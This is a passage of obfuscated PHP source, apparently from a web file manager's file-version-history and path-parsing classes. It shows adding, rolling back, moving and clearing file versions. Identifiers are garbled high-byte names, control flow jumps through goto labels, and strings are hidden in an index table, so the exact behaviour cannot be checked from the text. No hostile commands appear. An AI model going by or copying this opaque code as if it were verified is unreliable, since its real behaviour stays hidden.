±¥: } public static function eventAfterRemove($Eò´Ò¯„¤, $a§Áëî­¬) { goto dìµÔ§Œù ; Fé¯ƒ¬¥ò: if ($D¨šÎ…®Ğ„[$aÂ¾Šƒ…¨´[29]] == $aÂ¾Šƒ…¨´[193]) { $EÜé›ÛÕî¿ = self::listData($aöñãßå§‚, !1); if ($EÜé›ÛÕî¿ && $EÜé›ÛÕî¿[$aÂ¾Šƒ…¨´[367]]) { self::clear($aöñãßå§‚, !1); } } else { IO::remove($D¨šÎ…®Ğ„[$aÂ¾Šƒ…¨´[76]]); self::clearEmptyFolder(IO::pathFather($D¨šÎ…®Ğ„[$aÂ¾Šƒ…¨´[76]])); } goto D›êåë†Æ; dìµÔ§Œù : $aÂ¾Šƒ…¨´ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$a§Áëî­¬) { return; } $aöñãßå§‚ = self::parsePath($Eò´Ò¯„¤[0]); goto f™ÃøÀÕÎÂ; f™ÃøÀÕÎÂ: if (!$aöñãßå§‚) { return; } $D¨šÎ…®Ğ„ = self::checkInHistory($aöñãßå§‚); if (!$D¨šÎ…®Ğ„) { return; } goto Fé¯ƒ¬¥ò; D›êåë†Æ: } private static function checkInHistory($EòÙ²°åÍ¦) { $BØÖŞÔ©Æ = self::pathHistory($EòÙ²°åÍ¦); if (!IO::exist($BØÖŞÔ©Æ)) { $BØÖŞÔ©Æ .= $_SERVER[Ôğ—¤Šµˆ˜ñ£][1139]; } return IO::exist($BØÖŞÔ©Æ) ? IO::info($BØÖŞÔ©Æ) : !1; } private static function parsePath($e¥·Ñ©„é) { goto DÆâÉ÷®»; DÆâÉ÷®»: $dØâ½²Î­· =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$e¥·Ñ©„é) { return !1; } if ($GLOBALS[$dØâ½²Î­·[1140]]) { return; } goto eÔˆëÈæ£Ï; eÔˆëÈæ£Ï: $c‚ğšç¤³« = KodIO::parse($e¥·Ñ©„é); $bæ¬î¿ß›‹ = $c‚ğšç¤³«[$dØâ½²Î­·[29]]; $E°æÕöÑ ˜ = !$bæ¬î¿ß›‹ || $bæ¬î¿ß›‹ == KodIO::KOD_IO || $bæ¬î¿ß›‹ == KodIO::KOD_SHARE_ITEM; goto Cà‹î´‡½Î; d…‹…œò: self::log($GLOBALS[$dØâ½²Î­·[1064]] . $dØâ½²Î­·[1144] . $e¥·Ñ©„é); return $e¥·Ñ©„é; goto bÂÆŒÃãİ; AŸ—›†ÈùŒ: if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $FÀÆÖ·ÌŸ† = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $dØâ½²Î­·[1143]); foreach ($FÀÆÖ·ÌŸ† as $CÇÎÒª´«¥) { if (!$bæ¬î¿ß›‹ && substr($e¥·Ñ©„é, 0, strlen($CÇÎÒª´«¥)) == $CÇÎÒª´«¥) { return !1; } } goto d…‹…œò; Cà‹î´‡½Î: if (!$E°æÕöÑ ˜ || !$c‚ğšç¤³«[$dØâ½²Î­·[1141]]) { return !1; } if (substr($e¥·Ñ©„é, 0, strlen(DATA_PATH . $dØâ½²Î­·[1142])) == DATA_PATH . $dØâ½²Î­·[1142]) { return !1; } if ($bæ¬î¿ß›‹ == KodIO::KOD_SHARE_ITEM) { $cîÕĞÙ¢×Ï = IO::init($e¥·Ñ©„é); if ($cîÕĞÙ¢×Ï->pathParse[$dØâ½²Î­·[1069]]) { return self::parsePath($cîÕĞÙ¢×Ï->pathParse[$dØâ½²Î­·[1069]]); } return !1; } goto AŸ—›†ÈùŒ; bÂÆŒÃãİ: } private static function pathHistory($dâ•º˜¯à) { $BöğƒôÑ¡¯ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D°ÔšŒ§öÊ = self::$_historyBase . ltrim(KodIO::clear($dâ•º˜¯à), $BöğƒôÑ¡¯[8]); $D°ÔšŒ§öÊ = str_replace(array($BöğƒôÑ¡¯[1145]), array($BöğƒôÑ¡¯[1146]), $D°ÔšŒ§öÊ); return $D°ÔšŒ§öÊ; } public static function log($F¢ÏÚ©æŒî) { } public static function historyCount($A®­Æ†Ôª¥) { $dŞĞ³“ª­É =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a¡ã‡ÍÎ‹ = array(); $F²Êó´í«È = array(); foreach ($A®­Æ†Ôª¥ as $DÕ’Î›ĞÜ³) { $Dœ¼›ĞÛç = get_path_father($DÕ’Î›ĞÜ³); if (!$F²Êó´í«È[$Dœ¼›ĞÛç]) { $F²Êó´í«È[$Dœ¼›ĞÛç] = array(); } $F²Êó´í«È[$Dœ¼›ĞÛç][] = get_path_this($DÕ’Î›ĞÜ³); } foreach ($F²Êó´í«È as $Dœ¼›ĞÛç => $F™º…¬‚›) { $c°‰¿„ŸƒŞ = self::parsePath($Dœ¼›ĞÛç); if (!$c°‰¿„ŸƒŞ) { continue; } foreach ($F™º…¬‚› as $aë—¿Ø“İŠ) { $b½î…‘ßå… = self::listData(rtrim($c°‰¿„ŸƒŞ, $dŞĞ³“ª­É[8]) . $dŞĞ³“ª­É[8] . $aë—¿Ø“İŠ, !1); if ($b½î…‘ßå… && $b½î…‘ßå…[$dŞĞ³“ª­É[367]]) { $a¡ã‡ÍÎ‹[rtrim($Dœ¼›ĞÛç, $dŞĞ³“ª­É[8]) . $dŞĞ³“ª­É[8] . $aë—¿Ø“İŠ] = count($b½î…‘ßå…[$dŞĞ³“ª­É[367]]); } } } return $a¡ã‡ÍÎ‹; } public static function add($eíº¸æÈéø) { goto aÌßŒÑ£ˆ§; F‹ÚŠòšæÑ: $dÈ÷ïÎ¸Ì = $dÕÄŒ·ß¸[$bšã´ŸÉê¿[367]]; if ($Eã©¬î¬â[$bšã´ŸÉê¿[78]] == 0) { return; } if ($Eã©¬î¬â[$bšã´ŸÉê¿[78]] >= 1024 * 1024 * 500) { return !1; } goto bß•ØÖÛ‡º; b¹›·Ã™: $E…õ®‚ÎøÓ = array($bšã´ŸÉê¿[395] => $FŠ†½“ÁÁù, $bšã´ŸÉê¿[171] => $dªŒà½ğŸï, $bšã´ŸÉê¿[28] => $Eã©¬î¬â[$bšã´ŸÉê¿[28]] . $bšã´ŸÉê¿[95] . date($bšã´ŸÉê¿[1149]) . rand_string(1), $bšã´ŸÉê¿[78] => $Eã©¬î¬â[$bšã´ŸÉê¿[78]], $bšã´ŸÉê¿[446] => USER_ID, $bšã´ŸÉê¿[194] => time(), $bšã´ŸÉê¿[1150] => $bšã´ŸÉê¿[33]); IO::mkdir($dÕÄŒ·ß¸[$bšã´ŸÉê¿[1151]]); $E¢¾îØ‰¯ = IO::copy($eíº¸æÈéø, $dÕÄŒ·ß¸[$bšã´ŸÉê¿[1151]], !1, $E…õ®‚ÎøÓ[$bšã´ŸÉê¿[28]]); goto D•‹ÈŸé; c»ïÆêğ¡´: $A”­ÁĞÕ‘ö = Model($bšã´ŸÉê¿[751])->get($bšã´ŸÉê¿[1147]); $F×Êê¤Ùö = $GLOBALS[$bšã´ŸÉê¿[6]][$bšã´ŸÉê¿[88]][$bšã´ŸÉê¿[1125]]; $cÖïé‰Ù–Ó = $A”­ÁĞÕ‘ö == $bšã´ŸÉê¿[1148] ? 5 : $F×Êê¤Ùö; goto Aãœæ‰İª; aÌßŒÑ£ˆ§: $bšã´ŸÉê¿ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dÕÄŒ·ß¸ = self::listData($eíº¸æÈéø); if (!$dÕÄŒ·ß¸) { return; } goto c»ïÆêğ¡´; Aãœæ‰İª: if ($F×Êê¤Ùö <= 0) { return; } $dªŒà½ğŸï = IO::hashSimple($eíº¸æÈéø); $Eã©¬î¬â = IO::info($eíº¸æÈéø); goto F‹ÚŠòšæÑ; bß•ØÖÛ‡º: if ($dÈ÷ïÎ¸Ì && $dÈ÷ïÎ¸Ì[0][$bšã´ŸÉê¿[171]] == $dªŒà½ğŸï) { return !0; } if (array_key_exists($bšã´ŸÉê¿[196], $Eã©¬î¬â) && !$Eã©¬î¬â[$bšã´ŸÉê¿[196]]) { return !1; } $FŠ†½“ÁÁù = short_id(time()); goto b¹›·Ã™; D•‹ÈŸé: if (!$E¢¾îØ‰¯) { self::clearEmptyFolder($dÕÄŒ·ß¸[$bšã´ŸÉê¿[1151]]); return !1; } array_unshift($dÈ÷ïÎ¸Ì, $E…õ®‚ÎøÓ); if (count($dÈ÷ïÎ¸Ì) > $cÖïé‰Ù–Ó) { $còªëÍì ¤ = array_slice($dÈ÷ïÎ¸Ì, $cÖïé‰Ù–Ó); foreach ($còªëÍì ¤ as $dŒ•ßÚ™‰ƒ) { IO::remove($dÕÄŒ·ß¸[$bšã´ŸÉê¿[1151]] . $dŒ•ßÚ™‰ƒ[$bšã´ŸÉê¿[28]]); } $dÈ÷ïÎ¸Ì = array_slice($dÈ÷ïÎ¸Ì, 0, $cÖïé‰Ù–Ó); } goto e¤èÕ‚½Ü“; e¤èÕ‚½Ü“: return self::saveData($dÕÄŒ·ß¸[$bšã´ŸÉê¿[1152]], $dÈ÷ïÎ¸Ì); goto F°«ñÜ¦š­; F°«ñÜ¦š­: } public static function remove($DŸ¡³Äõè, $d£Ÿ„¾†¿) { $dÖÚåŠÈ£˜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EÓÉÉÕ¹ = self::listData($DŸ¡³Äõè); $bÛ–ñÉØÍÜ = array(); if (!$EÓÉÉÕ¹) { return !1; } foreach ($EÓÉÉÕ¹[$dÖÚåŠÈ£˜[367]] as $fƒ‰£‰Ïæ) { if ($fƒ‰£‰Ïæ[$dÖÚåŠÈ£˜[395]] == $d£Ÿ„¾†¿) { IO::remove($EÓÉÉÕ¹[$dÖÚåŠÈ£˜[1151]] . $fƒ‰£‰Ïæ[$dÖÚåŠÈ£˜[28]]); continue; } $bÛ–ñÉØÍÜ[] = $fƒ‰£‰Ïæ; } return self::saveData($EÓÉÉÕ¹[$dÖÚåŠÈ£˜[1152]], $bÛ–ñÉØÍÜ); } public static function clear($D“„ ¬Ô˜, $D‘ˆ—‘Â = true) { $E¢åä‚††… =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a¼‰­ˆ¥á = self::listData($D“„ ¬Ô˜, $D‘ˆ—‘Â); if (!$a¼‰­ˆ¥á) { return !1; } foreach ($a¼‰­ˆ¥á[$E¢åä‚††…[367]] as $A°¾’šó‹·) { IO::remove($a¼‰­ˆ¥á[$E¢åä‚††…[1151]] . $A°¾’šó‹·[$E¢åä‚††…[28]]); } return self::saveData($a¼‰­ˆ¥á[$E¢åä‚††…[1152]], array()); } public static function moveHistory($bøòˆ²•­, $D‚è¼¯Òë = '', $c‰àòòŞ•ò = '') { goto cÇ§†İÃñŸ; c¢óè‚ÀÇÃ: $f¶ç©”Ú„ï = $e£â†ùŠ²[1139]; $D‚è¼¯Òë = $D‚è¼¯Òë ? $D‚è¼¯Òë : get_path_this($bøòˆ²•­); $c‰àòòŞ•ò = $c‰àòòŞ•ò ? $c‰àòòŞ•ò : $Aö÷ñÄŞ¦•[$e£â†ùŠ²[1151]]; goto d¡¿ÒŒ‘ãà; d¡¿ÒŒ‘ãà: $CÊğ©óˆ¦’ = substr(get_path_this($Aö÷ñÄŞ¦•[$e£â†ùŠ²[1152]]), 0, -strlen($f¶ç©”Ú„ï)); foreach ($Aö÷ñÄŞ¦•[$e£â†ùŠ²[367]] as $AÑØ—¾‹Ò‡ => $D•Å›­Ú¦„) { $b“Š¶¸ÙÅ = $D‚è¼¯Òë . substr($D•Å›­Ú¦„[$e£â†ùŠ²[28]], strlen($CÊğ©óˆ¦’)); $BŠ“‡¿ÎÆ = IO::move($Aö÷ñÄŞ¦•[$e£â†ùŠ²[1151]] . $D•Å›­Ú¦„[$e£â†ùŠ²[28]], $c‰àòòŞ•ò, !1, $b“Š¶¸ÙÅ); if ($BŠ“‡¿ÎÆ) { $Aö÷ñÄŞ¦•[$e£â†ùŠ²[367]][$AÑØ—¾‹Ò‡][$e£â†ùŠ²[28]] = $b“Š¶¸ÙÅ; } } $Aö÷ñÄŞ¦•[$e£â†ùŠ²[1152]] = IO::move($Aö÷ñÄŞ¦•[$e£â†ùŠ²[1152]], $c‰àòòŞ•ò, !1, $D‚è¼¯Òë . $f¶ç©”Ú„ï); goto e¶ˆµ•¯Š; e¶ˆµ•¯Š: self::saveData($Aö÷ñÄŞ¦•[$e£â†ùŠ²[1152]], $Aö÷ñÄŞ¦•[$e£â†ùŠ²[367]]); self::clearEmptyFolder($Aö÷ñÄŞ¦•[$e£â†ùŠ²[1151]]); goto d²êªá–Ş¾; cÇ§†İÃñŸ: $e£â†ùŠ² =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Aö÷ñÄŞ¦• = self::listData($bøòˆ²•­, !1); if (!$Aö÷ñÄŞ¦• || !$Aö÷ñÄŞ¦•[$e£â†ùŠ²[367]]) { return !1; } goto c¢óè‚ÀÇÃ; d²êªá–Ş¾: } public static function rollback($cÙÈàÀ÷‘, $d×œÄõ•) { $A»±ÙŒİ«Š =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EÒÅİ…İö­ = self::listData($cÙÈàÀ÷‘); if (!$EÒÅİ…İö­) { return; } $aŸæ¹ÈğÙ = IO::info($cÙÈàÀ÷‘); foreach ($EÒÅİ…İö­[$A»±ÙŒİ«Š[367]] as $fŞéĞ‡ù«à => $CØ´ãìÆÔä) { if ($CØ´ãìÆÔä[$A»±ÙŒİ«Š[395]] == $d×œÄõ•) { self::add($cÙÈàÀ÷‘); $d¼Ú‚ßÀæ  = $EÒÅİ…İö­[$A»±ÙŒİ«Š[1151]] . $CØ´ãìÆÔä[$A»±ÙŒİ«Š[28]]; $FÔÒ£óŒÈİ = IO::copy($d¼Ú‚ßÀæ , IO::pathFather($cÙÈàÀ÷‘), REPEAT_REPLACE, $aŸæ¹ÈğÙ[$A»±ÙŒİ«Š[28]]); if ($FÔÒ£óŒÈİ) { self::remove($cÙÈàÀ÷‘, $d×œÄõ•); } return $FÔÒ£óŒÈİ; } } return !1; } public static function setDetail($EóéÚ¶Ÿòƒ, $C®Ö°ä†ò‡, $eÃ­Î³îÉ) { $d…Ó–±×Ó‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Cëˆ¨¤áÂ· = self::listData($EóéÚ¶Ÿòƒ); if (!$Cëˆ¨¤áÂ·) { return; } foreach ($Cëˆ¨¤áÂ·[$d…Ó–±×Ó‘[367]] as $aÙŸéïöô => $c„†ÆØï‹ƒ) { if ($c„†ÆØï‹ƒ[$d…Ó–±×Ó‘[395]] == $C®Ö°ä†ò‡) { $Cëˆ¨¤áÂ·[$d…Ó–±×Ó‘[367]][$aÙŸéïöô][$d…Ó–±×Ó‘[1150]] = $eÃ­Î³îÉ; self::saveData($Cëˆ¨¤áÂ·[$d…Ó–±×Ó‘[1152]], $Cëˆ¨¤áÂ·[$d…Ó–±×Ó‘[367]]); return !0; } } return !1; } public static function fileInfo($DßŠ×—ÃŒù, $Aç‘Š…ÚŒ) { goto Cğš®ò­„; Bšœ¢²«¨»: return IO::info($FˆÈ”ùÒè…); goto b¸óÖ£Ç‚ó; d±åŠ™ˆíŒ: $FˆÈ”ùÒè… = $cŞÊÚ®æëÜ[33]; foreach ($EÅÄÁŠ”²[$cŞÊÚ®æëÜ[367]] as $Aç’”ÍáÆ§ => $A®§ŒèÕÄÊ) { if ($A®§ŒèÕÄÊ[$cŞÊÚ®æëÜ[395]] != $Aç‘Š…ÚŒ) { continue; } $FˆÈ”ùÒè… = $EÅÄÁŠ”²[$cŞÊÚ®æëÜ[1151]] . $A®§ŒèÕÄÊ[$cŞÊÚ®æëÜ[28]]; break; } if (!$FˆÈ”ùÒè…) { show_json(LNG($cŞÊÚ®æëÜ[105]), !1); } goto Bšœ¢²«¨»; Cğš®ò­„: $cŞÊÚ®æëÜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EÅÄÁŠ”² = self::listData($DßŠ×—ÃŒù); if (!$EÅÄÁŠ”²) { show_json(LNG($cŞÊÚ®æëÜ[105]), !1); } goto d±åŠ™ˆíŒ; b¸óÖ£Ç‚ó: } public static function fileOut($a®Ğõ¼Ä’¹, $FÒÈ»–˜Ô‡, $cˆ™°è‘®ô = false) { $Eïˆí„¦ÔÈ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b±Ş¡‡ŸÎÚ = self::fileInfo($a®Ğõ¼Ä’¹, $FÒÈ»–˜Ô‡); $B©Œ´Šè™ =& $GLOBALS[$Eïˆí„¦ÔÈ[7]]; $cˆ™°è‘®ô = isset($B©Œ´Šè™[$Eïˆí„¦ÔÈ[1115]]) && $B©Œ´Šè™[$Eïˆí„¦ÔÈ[1115]] == 1; if (isset($B©Œ´Šè™[$Eïˆí„¦ÔÈ[29]]) && $B©Œ´Šè™[$Eïˆí„¦ÔÈ[29]] == $Eïˆí„¦ÔÈ[1153]) { return IO::fileOutImage($b±Ş¡‡ŸÎÚ[$Eïˆí„¦ÔÈ[76]], $B©Œ´Šè™[$Eïˆí„¦ÔÈ[1154]]); } IO::fileOut($b±Ş¡‡ŸÎÚ[$Eïˆí„¦ÔÈ[76]], $cˆ™°è‘®ô, get_path_this($a®Ğõ¼Ä’¹)); } public static function listData($f’·Û„‹, $BÖ®Ã¢Ï‚ë = true) { goto EŠÀáŞ›¹‡; EŠÀáŞ›¹‡: $eéÒà¦¼äÔ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($BÖ®Ã¢Ï‚ë && !IO::exist($f’·Û„‹)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto bÜâèèòÌ‡; bÜâèèòÌ‡: if (substr($f’·Û„‹, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $c´Â¡Óá³ˆ = self::pathHistory($f’·Û„‹); $dšò†ÜÉª¢ = array($eéÒà¦¼äÔ[1152] => $c´Â¡Óá³ˆ . $eéÒà¦¼äÔ[1139], $eéÒà¦¼äÔ[1151] => rtrim(get_path_father($c´Â¡Óá³ˆ), $eéÒà¦¼äÔ[8]) . $eéÒà¦¼äÔ[8], $eéÒà¦¼äÔ[367] => array()); goto Fø†§¹ˆë´; Fø†§¹ˆë´: $B×”¥—õöÕ = IO::getContent($dšò†ÜÉª¢[$eéÒà¦¼äÔ[1152]]); if ($B×”¥—õöÕ) { $DËÃ£Å– = json_decode($B×”¥—õöÕ, !0); if (is_array($DËÃ£Å–)) { $dšò†ÜÉª¢[$eéÒà¦¼äÔ[367]] = $DËÃ£Å–; } } return $dšò†ÜÉª¢; goto F”…¢¹äˆ‰; F”…¢¹äˆ‰: } private static function saveData($F•¡Ãôï, $d‚ĞÏõÕ‡Ê) { goto eÅôàà±²ß; dÏ ¦¸Ù¯Â: return !0; goto AÖÍÂ°—ù; eÅôàà±²ß: $c‡†¬İ¼ò® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; self::log($c‡†¬İ¼ò®[1155] . $F•¡Ãôï . $c‡†¬İ¼ò®[68] . count($d‚ĞÏõÕ‡Ê), $c‡†¬İ¼ò®[733]); if ($d‚ĞÏõÕ‡Ê) { return IO::setContent($F•¡Ãôï, json_encode($d‚ĞÏõÕ‡Ê)); } goto CöõĞ‘àí; CöõĞ‘àí: $DÛˆš½‡ºÔ = IO::pathFather($F•¡Ãôï); IO::remove($F•¡Ãôï); self::clearEmptyFolder($DÛˆš½‡ºÔ); goto dÏ ¦¸Ù¯Â; AÖÍÂ°—ù: } public static function clearEmptyFolder($BÆâç‘™±‹) { goto FÆÎÄÂô‚Œ; FÆÎÄÂô‚Œ: $f„º—ÀÓ›¡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (trim($BÆâç‘™±‹, $f„º—ÀÓ›¡[8]) == trim(self::$_historyBase, $f„º—ÀÓ›¡[8])) { return; } $aö¹ØÛ±åè = IO::pathFather($BÆâç‘™±‹); goto eİ‚ˆ£æ‘; B˜ãÃ¿Åëà: self::clearEmptyFolder($aö¹ØÛ±åè); goto eì’›Û¾ØÍ; eİ‚ˆ£æ‘: $BÜ‰­¦ = IO::has($BÆâç‘™±‹, !0); if ($BÜ‰­¦[$f„º—ÀÓ›¡[203]] > 0 || $BÜ‰­¦[$f„º—ÀÓ›¡[204]] > 0) { return; } IO::remove($BÆâç‘™±‹); goto B˜ãÃ¿Åëà; eì’›Û¾ØÍ: } private static function getBasePath() { goto eÜÖ‘øËÎè; f”¥Š÷Ö˜: $F¢¢ˆåõØ = DATA_PATH . $C½„À©êİ½[1158] . rand_string(8) . $C½„À©êİ½[8]; $F¢¢ˆåõØ = IO::mkdir($F¢¢ˆåõØ); $F¢¢ˆåõØ = rtrim($F¢¢ˆåõØ, $C½„À©êİ½[8]) . $C½„À©êİ½[8]; goto aİæŸÜ¡; aİæŸÜ¡: file_put_contents($F¢¢ˆåõØ . $C½„À©êİ½[1159], $C½„À©êİ½[33]); file_put_contents(DATA_PATH . $C½„À©êİ½[1159], $C½„À©êİ½[33]); Model($C½„À©êİ½[1156])->set($C½„À©êİ½[1157], $F¢¢ˆåõØ); goto bÇõÒéŠç; bÇõÒéŠç: return $F¢¢ˆåõØ; goto B¹ •Ñâë†; eÜÖ‘øËÎè: $C½„À©êİ½ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F¢¢ˆåõØ = Model($C½„À©êİ½[1156])->get($C½„À©êİ½[1157]); if ($F¢¢ˆåõØ) { if (!IO::exist($F¢¢ˆåõØ)) { IO::mkdir($F¢¢ˆåõØ); } if (get_path_this($F¢¢ˆåõØ) == $C½„À©êİ½[1142]) { $eÛÏµñ·¯ = $C½„À©êİ½[1158] . rand_string(8); @rename($F¢¢ˆåõØ, get_path_father($F¢¢ˆåõØ) . $C½„À©êİ½[8] . $eÛÏµñ·¯); $F¢¢ˆåõØ = DATA_PATH . $eÛÏµñ·¯ . $C½„À©êİ½[8]; file_put_contents(DATA_PATH . $C½„À©êİ½[1159], $C½„À©êİ½[33]); Model($C½„À©êİ½[1156])->set($C½„À©êİ½[1157], $F¢¢ˆåõØ); } return $F¢¢ˆåõØ; } goto f”¥Š÷Ö˜; B¹ •Ñâë†: } } class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\x72\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\162\x52\x65\x63\x79\x63\x6c\145\175"; const KOD_USER_FAV = "\x7b\165\x73\145\162\106\x61\x76\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\162\x46\151\x6c\x65\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\x72\106\151\x6c\x65\124\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\x75\x70\x52\x6f\x6f\x74\123\x65\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\x72\x53\x68\141\162\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\x65\162\123\x68\141\162\x65\x4c\x69\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\x72\x65\x54\157\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\141\x72\x65\x49\164\x65\x6d\175"; const KOD_SHARE_LINK = "\173\x73\150\x61\162\x65\x49\164\x65\155\114\x69\x6e\x6b\x7d"; const KOD_SEARCH = "\173\x73\145\x61\162\143\x68\x7d"; const KOD_BLOCK = "\173\x62\154\157\x63\x6b\x7d"; const KOD_IO = "\173\x69\157\175"; const KOD_USER_RECENT = "\173\165\x73\145\x72\122\x65\156\143\x65\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\x65\162\x7d"; public static function typeList() { $bß“ŸŒìÄ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return array($bß“ŸŒìÄ[1160] => self::KOD_SOURCE, $bß“ŸŒìÄ[1161] => self::KOD_USER_RECYCLE, $bß“ŸŒìÄ[1162] => self::KOD_USER_FAV, $bß“ŸŒìÄ[1163] => self::KOD_USER_FILE_TAG, $bß“ŸŒìÄ[1164] => self::KOD_USER_FILE_TYPE, $bß“ŸŒìÄ[1165] => self::KOD_GROUP_ROOT_SELF, $bß“ŸŒìÄ[1166] => self::KOD_USER_SHARE, $bß“ŸŒìÄ[1167] => self::KOD_USER_SHARE_LINK, $bß“ŸŒìÄ[1168] => self::KOD_USER_SHARE_TO_ME, $bß“ŸŒìÄ[1169] => self::KOD_SHARE_ITEM, $bß“ŸŒìÄ[1170] => self::KOD_SHARE_LINK, $bß“ŸŒìÄ[1171] => self::KOD_SEARCH, $bß“ŸŒìÄ[1172] => self::KOD_BLOCK, $bß“ŸŒìÄ[1173] => self::KOD_IO, $bß“ŸŒìÄ[1174] => self::KOD_USER_RECENT, $bß“ŸŒìÄ[1175] => self::KOD_USER_DRIVER); } public static function parse($EÇåß¼·ˆ¦) { goto bÈ™¢ˆ…ˆœ; bÈ™¢ˆ…ˆœ: $C¼ã”«Æ—Ê =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EÇåß¼·ˆ¦ = self::clear($EÇåß¼·ˆ¦); $c­ ÑÀ˜ˆÖ = array_values(self::typeList()); goto båìÕëÜ›; båìÕëÜ›: preg_match($C¼ã”«Æ—Ê[1176], $EÇåß¼·ˆ¦, $câ¼±°Á™); $dæ¶ŞĞœÂ½ = array($C¼ã”«Æ—Ê[417] => !1, $C¼ã”«Æ—Ê[1177] => !1, $C¼ã”«Æ—Ê[414] => !1, $C¼ã”«Æ—Ê[76] => $EÇåß¼·ˆ¦, $C¼ã”«Æ—Ê[1086] => !1, $C¼ã”«Æ—Ê[1085] => $C¼ã”«Æ—Ê[33]); if (is_array($câ¼±°Á™) && count($câ¼±°Á™) == 5) { $F‚àÛÇ„‚ì = $C¼ã”«Æ—Ê[1178] . $câ¼±°Á™[2] . $C¼ã”«Æ—Ê[325]; if (in_array($F‚àÛÇ„‚ì, $c­ ÑÀ˜ˆÖ)) { $dæ¶ŞĞœÂ½[$C¼ã”«Æ—Ê[1086]] = $câ¼±°Á™[1]; $dæ¶ŞĞœÂ½[$C¼ã”«Æ—Ê[29]] = $F‚àÛÇ„‚ì; $dæ¶ŞĞœÂ½[$C¼ã”«Æ—Ê[1179]] = substr($F‚àÛÇ„‚ì, 1, -1); $dæ¶ŞĞœÂ½[$C¼ã”«Æ—Ê[395]] = $câ¼±°Á™[3]; } $dæ¶ŞĞœÂ½[$C¼ã”«Æ—Ê[1085]] = $câ¼±°Á™[4]; } goto FŠ¼ƒ‰éæ¤; FŠ¼ƒ‰éæ¤: $dØ±‚øË“† = array($C¼ã”«Æ—Ê[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $dæ¶ŞĞœÂ½[$C¼ã”«Æ—Ê[1141]] = in_array($dæ¶ŞĞœÂ½[$C¼ã”«Æ—Ê[29]], $dØ±‚øË“†); return $dæ¶ŞĞœÂ½; goto Eàò“Ï˜«; Eàò“Ï˜«: } public static function isTruePath($bÙƒ—ÊâÙ ) { goto a™Ì±¨·ãÆ; d˜ÌĞì±•: if (strpos($bÙƒ—ÊâÙ , $càƒ¨™ïì½[1182]) === 0) { return !0; } return !1; goto dºñ›éÎ³µ; fºèã´ª¡±: if (strpos($bÙƒ—ÊâÙ , $càƒ¨™ïì½[1145]) === 0) { return !0; } if (strpos($bÙƒ—ÊâÙ , $càƒ¨™ïì½[1180]) === 0) { return !0; } if (strpos($bÙƒ—ÊâÙ , $càƒ¨™ïì½[1181]) === 0) { return !0; } goto d˜ÌĞì±•; a™Ì±¨·ãÆ: $càƒ¨™ïì½ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (substr($bÙƒ—ÊâÙ , 0, 1) != $càƒ¨™ïì½[1178]) { return !0; } if (strpos($bÙƒ—ÊâÙ , $càƒ¨™ïì½[403]) === 0) { return !0; } goto fºèã´ª¡±; dºñ›éÎ³µ: } public static function clear($f†šÇĞÏš) { goto fĞË¹¸™ÛØ; fĞË¹¸™ÛØ: $dÓ›èëÈˆ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f†šÇĞÏš = str_replace(array($dÓ›èëÈˆ[1059], $dÓ›èëÈˆ[229]), $dÓ›èëÈˆ[50], $f†šÇĞÏš); $f†šÇĞÏš = str_replace($dÓ›èëÈˆ[97], $dÓ›èëÈˆ[8], $f†šÇĞÏš); goto eÛ†ÂÍŞ½Ã; fçÊÖô‚¢: $f†šÇĞÏš = preg_replace($dÓ›èëÈˆ[1185], $dÓ›èëÈˆ[8], $f†šÇĞÏš); if ($f†šÇĞÏš == $dÓ›èëÈˆ[8]) { return $dÓ›èëÈˆ[8]; } $f†šÇĞÏš = rtrim($f†šÇĞÏš, $dÓ›èëÈˆ[8]); goto aà´ÀÅíÄé; aà´ÀÅíÄé: return $f†šÇĞÏš; goto dÑ°ñÉ…ÆÜ; eÛ†ÂÍŞ½Ã: $B½ÊÊ„Å’¼ = $dÓ›èëÈˆ[1183]; if (substr($f†šÇĞÏš, 0, 3) == $dÓ›èëÈˆ[1184]) { $f†šÇĞÏš = substr($f†šÇĞÏš, 3); } while (strstr($f†šÇĞÏš, $B½ÊÊ„Å’¼)) { $f†šÇĞÏš = str_replace($B½ÊÊ„Å’¼, $dÓ›èëÈˆ[8], $f†šÇĞÏš); } goto fçÊÖô‚¢; dÑ°ñÉ…ÆÜ: } public static function sourceID($E¬×¢¥ë§) { $EÌÄÒíç® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Câ¦’—Øó = self::parse($E¬×¢¥ë§); if ($Câ¦’—Øó[$EÌÄÒíç®[29]] !== 